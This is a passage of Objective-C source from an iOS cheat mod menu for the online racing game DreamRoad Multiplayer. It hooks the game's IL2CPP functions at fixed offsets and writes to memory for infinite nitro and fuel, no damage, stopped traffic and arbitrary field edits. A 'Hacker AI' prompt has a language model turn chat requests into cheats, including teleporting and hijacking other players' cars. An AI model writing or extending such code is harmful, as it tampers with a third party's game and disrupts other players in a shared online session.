// v97: Farlar Surekli Acik - RCCP_Lights bulup her frame lowBeam+highBeam = ON
static void few1n_applyAlwaysLights(void) {
    if (!isAlwaysLightsEnabled) return;
    if (!g_rccpLightsType || !g_mFindObjectsPlural || !i_runtime_invoke) return;
    static int tick = 0;
    // her 15 frame'de bir tara (arac spawn olduysa hemen bulur) - CPU dostu
    if ((tick++ % 15) != 0 && !unityAlive(g_myLights)) return;
    if (!unityAlive(g_myLights) && unityAlive(g_rb)) {
        @try {
            Vec3 myPos; rbGetPosIl(g_rb, &myPos);
            void* a[1]; a[0] = g_rccpLightsType;
            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
            if (!ptrOk(arr)) return;
            int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
            if (cnt <= 0 || cnt > 256) return;
            void** ls = (void**)((uintptr_t)arr + 0x20);
            void* best = NULL; float bestD = 1e18f;
            for (int i = 0; i < cnt; i++) {
                void* L = ls[i]; if (!unityAlive(L)) continue;
                Vec3 p; if (!few1n_objPos(L, &p)) continue;
                float dx=p.x-myPos.x,dy=p.y-myPos.y,dz=p.z-myPos.z; float d=dx*dx+dy*dy+dz*dz;
                if (d < bestD) { bestD = d; best = L; }
            }
            if (ptrOk(best) && bestD < 100.0f) g_myLights = best;
        } @catch (...) {}
        if (!unityAlive(g_myLights)) return;
    }
    @try {
        *(unsigned char*)((uintptr_t)g_myLights + 0x40) = 1;   // lowBeam SUREKLI ON
        *(unsigned char*)((uintptr_t)g_myLights + 0x41) = 1;   // highBeam SUREKLI ON
    } @catch (...) {}
}

// v100: Yardimci - belirli type'da tum objelere float yaz
static inline void few1n_writeFloatOnAllOfType(void* typeObj, int off, float val) {
    if (!typeObj || off <= 0 || !g_mFindObjectsPlural || !i_runtime_invoke) return;
    @try {
        void* a[1]; a[0] = typeObj;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(arr)) return;
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt <= 0 || cnt > 128) return;
        void** items = (void**)((uintptr_t)arr + 0x20);
        for (int i = 0; i < cnt; i++) {
            void* it = items[i]; if (!unityAlive(it)) continue;
            *(float*)((uintptr_t)it + off) = val;
        }
    } @catch (...) {}
}

// v100: Yardimci - belirli type'da tum objelere bool yaz
static inline void few1n_writeBoolOnAllOfType(void* typeObj, int off, bool val) {
    if (!typeObj || off <= 0 || !g_mFindObjectsPlural || !i_runtime_invoke) return;
    @try {
        void* a[1]; a[0] = typeObj;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(arr)) return;
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt <= 0 || cnt > 128) return;
        void** items = (void**)((uintptr_t)arr + 0x20);
        for (int i = 0; i < cnt; i++) {
            void* it = items[i]; if (!unityAlive(it)) continue;
            *(bool*)((uintptr_t)it + off) = val;
        }
    } @catch (...) {}
}

// v100: Timer'dan cagrilan cheat apply - butun aktif toggle'lari uygular
static void few1n_applyGizliCheats(void) {
    if (isInfiniteNosEnabled && g_offNosAmount > 0)
        few1n_writeFloatOnAllOfType(g_rccpNosTypeObj, g_offNosAmount, 100.0f);
    if (isInfiniteFuelEnabled) {
        if (g_offFuelFill > 0)    few1n_writeFloatOnAllOfType(g_rccpFuelTypeObj, g_offFuelFill, 999.0f);
        if (g_offFuelConsump > 0) few1n_writeFloatOnAllOfType(g_rccpFuelTypeObj, g_offFuelConsump, 0.0f);
    }
    if (isNoDamageV2Enabled) {
        if (g_offDamageMax > 0)  few1n_writeFloatOnAllOfType(g_rccpDamageTypeObj, g_offDamageMax, 0.0f);
        if (g_offDamageMult > 0) few1n_writeFloatOnAllOfType(g_rccpDamageTypeObj, g_offDamageMult, 0.0f);
    }
    if (isMaxRpmEnabled) {
        if (g_offEngineOverride > 0) few1n_writeBoolOnAllOfType(g_rccpEngineTypeObj, g_offEngineOverride, true);
        if (g_offEngineRpm > 0)      few1n_writeFloatOnAllOfType(g_rccpEngineTypeObj, g_offEngineRpm, 9000.0f);
    }
    if (isEngineImmortalEnabled) {
        // engineRunning bool - offset bilinmiyor, class'a field ekle runtime'da al
        if (g_rccpEngineTypeObj && i_class_get_field_from_name && i_field_get_offset) {
            @try {
                void* c = few1n_classAnyImage("", "RCCP_Engine");
                if (c) {
                    void* f = i_class_get_field_from_name(c, "engineRunning");
                    if (f) { int off = (int)i_field_get_offset(f); if (off > 0) few1n_writeBoolOnAllOfType(g_rccpEngineTypeObj, off, true); }
                }
            } @catch (...) {}
        }
    }
    // v102: Egzoz Alev Surekli - flameOnCutOff = true
    if (isExhaustFlameOnEnabled && g_offExhaustFlameCutoff > 0)
        few1n_writeBoolOnAllOfType(g_rccpExhaustTypeObj, g_offExhaustFlameCutoff, true);
    // v102: Emissive Parlak Boya - g_myRccp altındaki car mats'a _EmissionColor set et
    if (isEmissivePaintEnabled && g_mMatSetColor && g_carMatCount > 0 && i_runtime_invoke) {
        static void* g_mMatSetColorEmis = NULL;
        if (!g_mMatSetColorEmis && i_class_from_name && i_class_get_method_from_name) {
            void* mc = few1n_classAnyImage("UnityEngine", "Material");
            if (mc) g_mMatSetColorEmis = i_class_get_method_from_name(mc, "SetColor", 2);
        }
        // Fallback: mevcut MatSetColor kullan (albedo bile parlak yapiyor)
        Color4 hotEmis = {2.0f, 1.5f, 0.0f, 1.0f}; // HDR sari-turuncu
        for (int i = 0; i < g_carMatCount; i++) {
            if (unityAlive(g_carMats[i])) {
                void* a[1]; a[0] = &hotEmis;
                @try { i_runtime_invoke(g_mMatSetColor, g_carMats[i], a, NULL); } @catch (...) {}
            }
        }
    }
    if (isNoTrafficEnabled && g_hrTrafficCarTypeObj) {
        // HR_TrafficCar objelerini bul, hepsinin _ikx_k__BackingField (Rigidbody) hizini 0 yap
        @try {
            void* a[1]; a[0] = g_hrTrafficCarTypeObj;
            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
            if (ptrOk(arr)) {
                int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
                if (cnt > 0 && cnt < 256) {
                    void** items = (void**)((uintptr_t)arr + 0x20);
                    for (int i = 0; i < cnt; i++) {
                        void* it = items[i]; if (!unityAlive(it)) continue;
                        // maximumSpeed float - runtime resolve
                        void* c = few1n_classAnyImage("", "HR_TrafficCar");
                        if (c && i_class_get_field_from_name) {
                            void* f = i_class_get_field_from_name(c, "maximumSpeed");
                            if (f && i_field_get_offset) {
                                int off = (int)i_field_get_offset(f);
                                if (off > 0) *(float*)((uintptr_t)it + off) = 0.0f;
                            }
                        }
                    }
                }
            }
        } @catch (...) {}
    }
}

static void few1n_applySelektor(void) {
    if (!isSelektor) return;
    if (g_myLights && !unityAlive(g_myLights)) g_myLights = NULL;
    if (!unityAlive(g_myLights)) {
        static int sTick = 0;
        if ((sTick++ % 15) != 0) return;
        if (!g_rccpLightsType || !g_mFindObjectsPlural || !i_runtime_invoke || !unityAlive(g_rb)) return;
        @try {
            Vec3 myPos; rbGetPosIl(g_rb, &myPos);
            void* a[1]; a[0] = g_rccpLightsType;
            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
            if (!ptrOk(arr)) return;
            int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
            if (cnt < 0 || cnt > 256) return;
            void** ls = (void**)((uintptr_t)arr + 0x20);
            void* best = NULL; float bestD = 1e18f;
            for (int i = 0; i < cnt; i++) {
                void* L = ls[i]; if (!unityAlive(L)) continue;
                Vec3 p; if (!few1n_objPos(L, &p)) continue;
                float dx=p.x-myPos.x,dy=p.y-myPos.y,dz=p.z-myPos.z; float d=dx*dx+dy*dy+dz*dz;
                if (d < bestD) { bestD = d; best = L; }
            }
            if (ptrOk(best) && bestD < 100.0f) g_myLights = best;
        } @catch (...) {}
        return;
    }
    @try {
        g_selTick++;
        int rate = (g_selFlashRate >= 1) ? g_selFlashRate : 1;
        unsigned char on = (((g_selTick / rate) % 2) == 0) ? 1 : 0;   // hiz menuden ayarli
        *(unsigned char*)((uintptr_t)g_myLights + 0x41) = on;   // highBeamHeadlights
        *(unsigned char*)((uintptr_t)g_myLights + 0x40) = on;   // lowBeamHeadlights (gorunurluk icin)
    } @catch (...) {}
}

// ===== GERCEK COZUM: CarPlayerInput.FixedUpdate (SADECE YEREL OYUNCU) =====
// script.json + il2cpp.h ile dogrulandi:
//   CarPlayerInput$$FixedUpdate = RVA 0x54D0BC0  (88935360)
//   CarPlayerInput_Fields: +0x20 jhr=CarDriveSystem*, +0x28 jhs=CarNitro*
//   CarDriveSystem_Fields: +0x48 _jfu_k__BackingField = UnityEngine.Rigidbody*
// NOT: CarDriveSystem'de Update/FixedUpdate YOK -> eski hooklar bu yuzden hic tetiklenmedi.
static void (*o_playerInputFixed)(void*) = NULL;
static void h_playerInputFixed(void* self) {
    fInput++;
    if (self && ptrOk(self)) {
        @try {
            void* drive = *(void**)((uintptr_t)self + 0x20);   // jhr -> CarDriveSystem
            if (drive) {
                g_carDrive = drive;
                void* rb = *(void**)((uintptr_t)drive + 0x48); // Rigidbody backing field
                if (rb) g_rb = rb;
            }
            void* nos = *(void**)((uintptr_t)self + 0x28);     // jhs -> CarNitro
            if (nos) g_carNitro = nos;
            // ---- ARAC KONTROL PANELI: oyunun kendi override alanlarini kullan ----
            // timeScale'e dokunmaz -> sadece bu arac etkilenir, digerleri fark etmez
            if (isCarPanelEnabled && g_carDrive) {
                uintptr_t d = (uintptr_t)g_carDrive;
                *(unsigned char*)(d + 0x61) = 1;              // overrideAcceleration
                *(float*)(d + 0x6C) = carAccelPower;          // overrideAccelerationPower
                *(unsigned char*)(d + 0x62) = 1;              // overrideSteering
                *(float*)(d + 0x64) = carSteerPower;          // overrideSteeringPower
                *(float*)(d + 0x98) = carTopSpeed;            // topSpeed
            }
        } @catch (...) {}
    }
    if (o_playerInputFixed) o_playerInputFixed(self);
}

// v92: RCCP_Damage.Update hook GERI ALINDI — dokunmatik/input bug sebep olabilir

// ===== RCCP araba (oyuncu bunu kullaniyor) - Rigidbody yakala =====
// RCCP_MainComponent Rigidbody @ self+0x48
static void (*o_rccpUpdate)(void*) = NULL;
static void h_rccpUpdate(void* self) {
    fRccp++;
    if (self) {
        @try {
            void* rb = *(void**)((uintptr_t)self + 0x48);   // RCCP Rigidbody
            if (rb) g_rb = rb;
        } @catch (...) {}
    }
    if (o_rccpUpdate) o_rccpUpdate(self);
}

// ===== SmoothSync (AGDAKI TUM ARABALAR - oyuncu dahil) : Rigidbody yakala =====
// SmoothSyncRCC.rb @ 0xF8 (Rigidbody), carController @ 0xF0
static void (*o_smRCC)(void*) = NULL;
static void h_smRCC(void* self) {
    fSmRCC++;
    if (self) {
        @try {
            void* rb = *(void**)((uintptr_t)self + 0xF8);   // SmoothSyncRCC.rb
            if (rb) g_rb = rb;
        } @catch (...) {}
    }
    if (o_smRCC) o_smRCC(self);
}
static void (*o_smPUN)(void*) = NULL;
static void h_smPUN(void* self) {
    fSmPUN++;
    if (o_smPUN) o_smPUN(self);
}

// ===== CUSTOM PLATE =====
static void (*o_plateChange)(void*, struct PlateHolder) = NULL;
static void h_plateChange(void* self, struct PlateHolder holder) {
    fPlate++;
    if (isCustomPlateEnabled && customPlateText[0] != '\0') {
        void* r = mkStr([NSString stringWithUTF8String:customPlateText]);
        if (r) holder.t = r;
    }
    if (o_plateChange) o_plateChange(self, holder);
}

// ===== HTML/TMPro METİN KODLARINI TEMİZLEME YARDIMCISI =====
static NSString* stripRichTextTags(NSString *text) {
    if (!text || text.length == 0) return @"";
    NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"<[^>]*>" options:NSRegularExpressionCaseInsensitive error:nil];
    return [regex stringByReplacingMatchesInString:text options:0 range:NSMakeRange(0, text.length) withTemplate:@""];
}

// ===== CHAT =====
// v110: ChatManager.fup(string) - GELEN chat mesaji (baska oyuncudan geldigi zaman burada tetiklenir)
// v114.4 BUILD FIX: gercek body AI globalleri/fonksiyonlarından SONRA tanımlı (asagida)
static void (*o_chatFup)(void*, void*) = NULL;
static void h_chatFup(void* self, void* msg);   // forward decl - body aşağıda
// h_chatSend NSClassFromString+performSelector kullaniyor; forward decl gerekmiyor.

static void (*o_chatSend)(void*, void*) = NULL;
// AI Sohbet Modu: /ai prefix'i olmadan aktif konusma
static bool isAiChatModeEnabled = false;
static NSMutableArray<NSString*> *g_recentlySentByMe = nil;  // son 10 mesaj (kendi mesajlarima cevap vermemek icin)
// v114.4: AI cevap renkleri (kullanici NSUserDefaults'tan sec)
static char g_aiNameColorHex[8] = "00E5FF";  // cyan default
static char g_aiReplyColorHex[8] = "FF00FF"; // magenta default

// v113: Runtime il2cpp field enumerate + write helpers
static void* (*i_class_get_fields)(void*, void**) = NULL;   // il2cpp_class_get_fields (iter)
static const char* (*i_field_get_name)(void*) = NULL;       // il2cpp_field_get_name
static void* (*i_field_get_type)(void*) = NULL;             // il2cpp_field_get_type
static const char* (*i_type_get_name)(void*) = NULL;        // il2cpp_type_get_name

static NSString* few1n_dumpClassFields(NSString *className) {
    if (!className || className.length == 0 || !i_class_from_name) return @"class API yok";
    // Class'i tum image'larda ara
    if (!i_class_get_fields) {
        i_class_get_fields = (void*(*)(void*,void**))dlsym(RTLD_DEFAULT, "il2cpp_class_get_fields");
        i_field_get_name   = (const char*(*)(void*))dlsym(RTLD_DEFAULT, "il2cpp_field_get_name");
        i_field_get_type   = (void*(*)(void*))dlsym(RTLD_DEFAULT, "il2cpp_field_get_type");
        i_type_get_name    = (const char*(*)(void*))dlsym(RTLD_DEFAULT, "il2cpp_type_get_name");
    }
    void* klass = NULL;
    // Bilinen namespace'lerde dene
    NSArray *ns = @[@"", @"Photon.Realtime", @"Photon.Pun", @"UnityEngine", @"UnityEngine.UI", @"TMPro"];
    for (NSString *n in ns) { klass = few1n_classAnyImage(n.UTF8String, className.UTF8String); if (klass) break; }
    if (!klass) return [NSString stringWithFormat:@"class '%@' bulunamadi", className];
    if (!i_class_get_fields || !i_field_get_name) return [NSString stringWithFormat:@"class %@ VAR (%p) ama field enum API yok", className, klass];
    NSMutableString *out = [NSMutableString stringWithFormat:@"[%@ @ %p]\n", className, klass];
    void* iter = NULL;
    int cnt = 0;
    void* f;
    while ((f = i_class_get_fields(klass, &iter)) && cnt < 40) {
        const char *fname = i_field_get_name(f);
        int off = i_field_get_offset ? (int)i_field_get_offset(f) : -1;
        NSString *typ = @"?";
        if (i_field_get_type && i_type_get_name) {
            void* tp = i_field_get_type(f);
            if (tp) { const char *tn = i_type_get_name(tp); if (tn) typ = [NSString stringWithUTF8String:tn]; }
        }
        [out appendFormat:@"  %s @+%d (%@)\n", fname ?: "?", off, typ];
        cnt++;
    }
    if (cnt >= 40) [out appendString:@"...(daha var, ilk 40)"];
    return out;
}

// Belirli class'in TUM instance'larina field yaz - runtime dinamik
// type: "bool"=1byte, "int"=4byte int, "float"=4byte, "double"=8byte
static NSString* few1n_writeFieldOnAllOfClass(NSString *className, NSString *fieldName, NSString *typeStr, NSString *valueStr) {
    if (!i_class_from_name || !i_class_get_field_from_name || !i_field_get_offset || !g_mFindObjectsPlural || !i_runtime_invoke)
        return @"API hazir degil";
    void* klass = NULL;
    NSArray *ns = @[@"", @"Photon.Realtime", @"Photon.Pun", @"UnityEngine", @"TMPro"];
    for (NSString *n in ns) { klass = few1n_classAnyImage(n.UTF8String, className.UTF8String); if (klass) break; }
    if (!klass) return [NSString stringWithFormat:@"class %@ yok", className];
    void* f = i_class_get_field_from_name(klass, fieldName.UTF8String);
    if (!f) return [NSString stringWithFormat:@"%@.%@ field yok", className, fieldName];
    int off = (int)i_field_get_offset(f);
    if (off <= 0) return @"offset 0";
    // typeObj bul: class -> Type
    void* typeObj = few1n_typeObjOf(klass);
    if (!typeObj) return @"typeObj yok";
    @try {
        void* a[1]; a[0] = typeObj;
        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, a, NULL);
        if (!ptrOk(arr)) return @"instance yok";
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
        if (cnt <= 0 || cnt > 128) return [NSString stringWithFormat:@"cnt anormal %d", cnt];
        void** items = (void**)((uintptr_t)arr + 0x20);
        int wrote = 0;
        for (int i = 0; i < cnt; i++) {
            void* it = items[i]; if (!unityAlive(it)) continue;
            @try {
                if ([typeStr isEqualToString:@"bool"]) {
                    bool v = [valueStr.lowercaseString isEqualToString:@"true"] || [valueStr intValue] != 0;
                    *(bool*)((uintptr_t)it + off) = v;
                } else if ([typeStr isEqualToString:@"int"] || [typeStr isEqualToString:@"int32"]) {
                    *(int32_t*)((uintptr_t)it + off) = [valueStr intValue];
                } else if ([typeStr isEqualToString:@"float"]) {
                    *(float*)((uintptr_t)it + off) = [valueStr floatValue];
                } else if ([typeStr isEqualToString:@"double"]) {
                    *(double*)((uintptr_t)it + off) = [valueStr doubleValue];
                } else return [NSString stringWithFormat:@"type '%@' desteklenmiyor (bool/int/float/double)", typeStr];
                wrote++;
            } @catch (...) {}
        }
        return [NSString stringWithFormat:@"✓ %@.%@ @+%d = %@ [%d instance]", className, fieldName, off, valueStr, wrote];
    } @catch (...) { return @"exception"; }
}

// v109: OpenAI-uyumlu AI API entegrasyonu (Groq, Grok/xAI veya custom).
// API anahtari kaynak koda gomulmez; kullanici kendi anahtarini ilgili provider icin kaydeder.
static NSString* g_groqApiKey = nil;
static NSString* g_groqModel = nil;  // v114.4: runtime degistirilebilir
static NSString* const kGroqModelDefault = @"llama-3.3-70b-versatile";  // Groq ucretsiz, Turkce destekli (test edildi)
static NSString* const kGrokModelDefault = @"grok-4.5";
// Provider secim - Groq (ucretsiz) veya Grok (xAI odemeli) veya Custom.
static NSString* g_apiEndpoint = nil;
static NSString* const kEndpointGroq = @"https://api.groq.com/openai/v1/chat/completions";
static NSString* const kEndpointGrok = @"https://api.x.ai/v1/chat/completions";
static inline NSString* kApiEndpoint(void) {
    if (g_apiEndpoint && g_apiEndpoint.length > 0) return g_apiEndpoint;
    NSString *e = [[NSUserDefaults standardUserDefaults] stringForKey:@"few1n_apiEndpoint"];
    if (e && e.length > 0) { g_apiEndpoint = e; return e; }
    g_apiEndpoint = kEndpointGroq;
    return g_apiEndpoint;
}

static inline BOOL few1n_isGrokProvider(void) {
    return [kApiEndpoint().lowercaseString containsString:@"api.x.ai"];
}
static inline NSString* few1n_aiProviderName(void) {
    NSString *endpoint = kApiEndpoint().lowercaseString;
    if ([endpoint containsString:@"api.x.ai"]) return @"Grok";
    if ([endpoint containsString:@"api.groq.com"]) return @"Groq";
    return @"Ozel API";
}
static inline NSString* few1n_aiKeyStorageKey(void) {
    if (few1n_isGrokProvider()) return @"few1n_grokKey";
    if ([kApiEndpoint().lowercaseString containsString:@"api.groq.com"]) return @"few1n_groqKey";
    return @"few1n_customAiKey";
}
static void few1n_setAiProvider(NSString *endpoint, NSString *model) {
    if (endpoint.length == 0) return;
    g_apiEndpoint = endpoint;
    g_groqApiKey = nil;  // Her provider kendi API key'ini kullanir.
    [[NSUserDefaults standardUserDefaults] setObject:endpoint forKey:@"few1n_apiEndpoint"];
    if (model.length > 0) {
        g_groqModel = model;
        [[NSUserDefaults standardUserDefaults] setObject:model forKey:@"few1n_groqModel"];
    }
}
static inline NSString* kGroqModel(void) {  // Eski isim korunuyor; secili provider'in modelini verir.
    if (g_groqModel && g_groqModel.length > 0) return g_groqModel;
    NSString *m = [[NSUserDefaults standardUserDefaults] stringForKey:@"few1n_groqModel"];
    // Onceki surumde Grok endpoint'i seciliyken Groq varsayilan modeli kalmis olabilir.
    if (few1n_isGrokProvider() && (!m || [m isEqualToString:kGroqModelDefault])) m = kGrokModelDefault;
    if (m && m.length > 0) { g_groqModel = m; return m; }
    g_groqModel = few1n_isGrokProvider() ? kGrokModelDefault : kGroqModelDefault;
    return g_groqModel;
}

static inline NSString* few1n_groqApiKey(void) {
    if (g_groqApiKey && g_groqApiKey.length > 0) return g_groqApiKey;
    NSString *k = [[NSUserDefaults standardUserDefaults] stringForKey:few1n_aiKeyStorageKey()];
    if (k && k.length > 0) { g_groqApiKey = k; return k; }
    return nil;
}

static void few1n_groqAsk(NSString *prompt, void(^completion)(NSString*)) {
    NSString *key = few1n_groqApiKey();
    if (!key || key.length == 0) {
        FLog([NSString stringWithFormat:@"🤖 %@ API key ayarlanmamis", few1n_aiProviderName()]);
        completion(nil); return;
    }
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:kApiEndpoint()]];
    req.HTTPMethod = @"POST";
    req.timeoutInterval = 8.0;
    [req setValue:[NSString stringWithFormat:@"Bearer %@", key] forHTTPHeaderField:@"Authorization"];
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    NSDictionary *body = @{
        @"model": kGroqModel(),
        @"messages": @[
            @{@"role": @"system", @"content": @"Sen DreamRoad Multiplayer yaris oyununda chat'te AI botsun. Turkce cevap ver, cok kisa (max 15 kelime), argo/sohbet dilinde. Kufur yok. Emoji cok az."},
            @{@"role": @"user", @"content": prompt ?: @""}
        ],
        @"max_tokens": @80,
        @"temperature": @0.9,
        @"stream": @NO
    };
    NSError *jerr = nil;
    req.HTTPBody = [NSJSONSerialization dataWithJSONObject:body options:0 error:&jerr];
    if (jerr) { completion(nil); return; }
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
        if (err || !data) { FLog([NSString stringWithFormat:@"🤖 %@ err: %@", few1n_aiProviderName(), err.localizedDescription ?: @"no data"]); completion(nil); return; }
        NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
        NSHTTPURLResponse *http = [resp isKindOfClass:[NSHTTPURLResponse class]] ? (NSHTTPURLResponse*)resp : nil;
        if (http && (http.statusCode < 200 || http.statusCode >= 300)) {
            NSDictionary *httpError = [json isKindOfClass:[NSDictionary class]] ? json[@"error"] : nil;
            FLog([NSString stringWithFormat:@"🤖 %@ HTTP %ld: %@", few1n_aiProviderName(), (long)http.statusCode, httpError[@"message"] ?: @"API istegi basarisiz"]);
            completion(nil); return;
        }
        if (![json isKindOfClass:[NSDictionary class]]) { completion(nil); return; }
        NSDictionary *errObj = json[@"error"];
        if ([errObj isKindOfClass:[NSDictionary class]]) { FLog([NSString stringWithFormat:@"🤖 %@ API error: %@", few1n_aiProviderName(), errObj[@"message"] ?: errObj]); completion(nil); return; }
        NSArray *choices = json[@"choices"];
        if (![choices isKindOfClass:[NSArray class]] || choices.count == 0) { completion(nil); return; }
        NSDictionary *msg2 = choices[0][@"message"];
        NSString *content = msg2[@"content"];
        if (![content isKindOfClass:[NSString class]] || content.length == 0) { completion(nil); return; }
        completion([content stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]]);
    }] resume];
}

// v112: Hacker AI - JSON action donduren system prompt ile mod'daki hile'leri tetikle
static NSString* const kHackerSystem = @"Sen DreamRoad hile bot'usun. Kullanici dogal dilde istedigini yazar, sen SADECE JSON dondurursun (baska hicbir sey yok, aciklama yok). Format: {\"action\":\"NAME\",\"state\":\"on|off|toggle\"}. Coklu istek varsa array: [{\"action\":\"X\",\"state\":\"on\"},{\"action\":\"Y\",\"state\":\"off\"}]. Kullanilabilir action'lar:\n- infinite_nos: sonsuz NOS\n- infinite_fuel: sonsuz yakit\n- no_damage: hasar yok\n- max_rpm: motor max rpm/turbo\n- engine_immortal: motor olmez\n- no_traffic: trafik dursun\n- emissive: parlak emissive boya\n- exhaust_flame: egzoz alev surekli\n- godmode: godmode\n- drift: drift modu\n- fly: ucus\n- noclip: no-clip\n- selektor: far cakma\n- balata: balata sicak sari\n- popbangs: pop bangs egzoz\n- autohorn: otomatik korna\n- brakeglow: balata glow\n- carsize: buyuk arac boyutu\n- speed_low: yavas hiz\n- speed_high: hizli hiz\n- detach: parca sok firlat (action, state gerekmez)\n- teleport_all: herkesi bana teleport (action)\n- hijack: yabanci arac hijack (action)\n- unknown: taninmayan istek\n\nOrnek: 'sonsuz gaz ac' -> {\"action\":\"infinite_nos\",\"state\":\"on\"}\n'trafik dur ve motor olsun' -> [{\"action\":\"no_traffic\",\"state\":\"on\"},{\"action\":\"engine_immortal\",\"state\":\"on\"}]\n'her seyi kapat' -> [{\"action\":\"infinite_nos\",\"state\":\"off\"},{\"action\":\"infinite_fuel\",\"state\":\"off\"},{\"action\":\"no_damage\",\"state\":\"off\"},{\"action\":\"godmode\",\"state\":\"off\"}]\n'herkesi ver' -> {\"action\":\"teleport_all\"}";

static void few1n_hackerAsk(NSString *prompt, void(^completion)(NSArray*)) {
    NSString *key = few1n_groqApiKey();
    if (!key || key.length == 0) { completion(nil); return; }
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:kApiEndpoint()]];
    req.HTTPMethod = @"POST";
    req.timeoutInterval = 10.0;
    [req setValue:[NSString stringWithFormat:@"Bearer %@", key] forHTTPHeaderField:@"Authorization"];
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    NSDictionary *body = @{
        @"model": kGroqModel(),
        @"messages": @[
            @{@"role": @"system", @"content": kHackerSystem},
            @{@"role": @"user", @"content": prompt ?: @""}
        ],
        @"max_tokens": @400,
        @"temperature": @0.2,
        @"response_format": @{@"type": @"json_object"}
    };
    req.HTTPBody = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
        if (err || !data) { completion(nil); return; }
        NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
        NSArray *choices = json[@"choices"];
        if (![choices isKindOfClass:[NSArray class]] || choices.count == 0) { completion(nil); return; }
        NSString *content = choices[0][@"message"][@"content"];
        if (![content isKindOfClass:[NSString class]]) { completion(nil); return; }
        // parse JSON
        NSData *jd = [content dataUsingEncoding:NSUTF8StringEncoding];
        id parsed = [NSJSONSerialization JSONObjectWithData:jd options:0 error:nil];
        NSMutableArray *actions = [NSMutableArray array];
        if ([parsed isKindOfClass:[NSDictionary class]]) [actions addObject:parsed];
        else if ([parsed isKindOfClass:[NSArray class]]) [actions addObjectsFromArray:parsed];
        // Bazi API "actions" key'li obje dondurebiliyor
        else if ([parsed isKindOfClass:[NSDictionary class]] && [parsed[@"actions"] isKindOfClass:[NSArray class]]) [actions addObjectsFromArray:parsed[@"actions"]];
        completion(actions);
    }] resume];
}

// v108: Basit kural tabanli AI cevap - /ai prefix ile chat'te calisir (Groq basarisiz olursa fallback)
static NSString* few1n_aiReply(NSString *prompt) {
    if (!prompt || prompt.length == 0) return @"boş mesaj?";
    NSString *p = [prompt.lowercaseString stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
    // Turkce karakter normalize
    p = [p stringByReplacingOccurrencesOfString:@"ı" withString:@"i"];
    p = [p stringByReplacingOccurrencesOfString:@"ş" withString:@"s"];
    p = [p stringByReplacingOccurrencesOfString:@"ç" withString:@"c"];
    p = [p stringByReplacingOccurrencesOfString:@"ğ" withString:@"g"];
    p = [p stringByReplacingOccurrencesOfString:@"ü" withString:@"u"];
    p = [p stringByReplacingOccurrencesOfString:@"ö" withString:@"o"];
    p = [p stringByReplacingOccurrencesOfString:@"i̇" withString:@"i"];
    // Kural tabanli responses
    struct { NSString *pattern; NSArray *replies; } rules[] = {
        {@"naber|nasilsin|nabersin|nabar", @[@"iyi sen naber", @"iyiyim keyifler nasil", @"su an moddayim", @"top", @"bomba gibi"]},
        {@"selam|slm|sa|merhaba|hi|hello|selamun|aleyk", @[@"selam", @"aleykumselam", @"hos geldin", @"nabersin", @"as"]},
        {@"kim|adin ne|isim|nick", @[@"ben FEW1N AI", @"mod menu botuyum", @"FEW1N", @"AI botum"]},
        {@"kac|yasin|yas", @[@"18", @"sonsuz yas", @"sen kac", @"iyi bi yas"]},
        {@"iyi|guzel|super|harika", @[@"iyi kardes", @"eyw", @"guzelmis"]},
        {@"neden|niye|nicin|nasil", @[@"cunku oyle", @"bilmem", @"kader", @"hayat iste"]},
        {@"hile|cheat|mod|mod menu|mods", @[@"FEW1N Mod Menu var indir", @"hilesiz oynanmaz", @"mod acik biraz karisik"]},
        {@"seni sever|seviyorum|love", @[@"ben de", @"sagol dostum", @"bende seviyorum"]},
        {@"kufur|orospu|amk|amina|siktir|piç", @[@"kufur etme", @"agzini topla", @"ok dostum sakin", @"ben AI'im etkilenmem"]},
        {@"para|zengin|money", @[@"borsada olsa oldu", @"para bende yok", @"crypto al", @"harcamak lazim"]},
        {@"ne yap|nolur|dua|ne oldu", @[@"gaz gaz devam", @"drift at", @"gaz kes fren yap", @"aracina bak"]},
        {@"kim iyi|en iyi|kral", @[@"FEW1N kral", @"tabiki ben", @"sen iyisin", @"hepiniz iyisiniz"]},
        {@"nerelisin|nerdesin|nerede", @[@"internetteyim", @"her yerdeyim", @"lobide"]},
        {@"hoscakal|bay|gule gule|byes|bye", @[@"gule gule", @"gorusruz", @"kacma dur"]},
        {@"help|yardim|komut", @[@"soyle bakalim ne var ne yok", @"AI botum, konus benimle", @"chat yaz cevap alirsin"]},
    };
    int n = sizeof(rules) / sizeof(rules[0]);
    for (int i = 0; i < n; i++) {
        NSRegularExpression *re = [NSRegularExpression regularExpressionWithPattern:rules[i].pattern options:NSRegularExpressionCaseInsensitive error:nil];
        if (re && [re numberOfMatchesInString:p options:0 range:NSMakeRange(0, p.length)] > 0) {
            NSArray *rr = rules[i].replies;
            return rr[arc4random_uniform((uint32_t)rr.count)];
        }
    }
